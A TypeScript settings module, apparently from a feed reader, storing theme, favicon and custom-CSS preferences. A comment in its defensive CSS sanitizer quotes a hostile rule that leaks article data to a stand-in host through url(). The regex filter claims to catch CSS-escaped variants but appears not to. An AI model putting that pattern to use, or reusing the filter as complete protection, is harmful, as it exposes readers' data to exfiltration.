export type ThemeSetting = 'light' | 'dark' | 'system'

const UI_KEY = 'dripfeed.uiTheme'
const ARTICLE_KEY = 'dripfeed.articleTheme'

export function loadThemeSetting(key: string): ThemeSetting {
  try {
    const v = localStorage.getItem(key)
    if (v === 'light' || v === 'dark' || v === 'system') return v
  } catch {
    /* ignore */
  }
  return 'system'
}

export function saveThemeSetting(key: string, v: ThemeSetting): void {
  try {
    localStorage.setItem(key, v)
  } catch {
    /* ignore */
  }
}

export const uiThemeKey = UI_KEY

export const articleThemeKey = ARTICLE_KEY

const ARTICLE_CSS_MODE_KEY = 'dripfeed.articleCssMode'
const ARTICLE_CSS_KEY = 'dripfeed.articleCss'

export type ArticleCssMode = 'default' | 'custom'

export function loadArticleCssMode(): ArticleCssMode {
  try {
    const v = localStorage.getItem(ARTICLE_CSS_MODE_KEY)
    if (v === 'default' || v === 'custom') return v
  } catch {
    /* ignore */
  }
  return 'default'
}

export function saveArticleCssMode(v: ArticleCssMode): void {
  try {
    localStorage.setItem(ARTICLE_CSS_MODE_KEY, v)
  } catch {
    /* ignore */
  }
}

export function loadArticleCss(): string {
  try {
    return localStorage.getItem(ARTICLE_CSS_KEY) ?? ''
  } catch {
    return ''
  }
}

export function saveArticleCss(v: string): void {
  try {
    localStorage.setItem(ARTICLE_CSS_KEY, v)
  } catch {
    /* ignore */
  }
}

/**
 * Strip the parts of user-pasted CSS that could exfiltrate article content
 * or pull in remote resources from within the sandboxed frame: url(...)
 * (including data: and css-escaped variants) and @import. The article body
 * is untrusted HTML rendered with allow-same-origin, so we don't want a
 * hostile rule like `background: url(//evil/x?` + selector to fire.
 */
export function sanitizeArticleCss(css: string): string {
  return css
    .replace(/url\s*\([^)]*\)/gi, 'none')
    .replace(/@import[^;]*;?/gi, '')
    .replace(/@import\b[^\n]*(?:\n|$)/gi, '')
}

const FAVICONS_KEY = 'dripfeed.showFavicons'

export function loadShowFavicons(): boolean {
  try {
    return localStorage.getItem(FAVICONS_KEY) !== '0'
  } catch {
    return true
  }
}

export function saveShowFavicons(v: boolean): void {
  try {
    localStorage.setItem(FAVICONS_KEY, v ? '1' : '0')
  } catch {
    /* ignore */
  }
}

/** Resolve a light/dark/system setting against the OS preference. */
export function effectiveTheme(setting: ThemeSetting): 'light' | 'dark' {
  if (setting !== 'system') return setting
  return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
}

/** Apply the resolved UI theme to <html data-theme>. */
export function applyUiTheme(setting: ThemeSetting): void {
  const eff = effectiveTheme(setting)
  document.documentElement.dataset.theme = eff
  document.documentElement.style.colorScheme = eff
}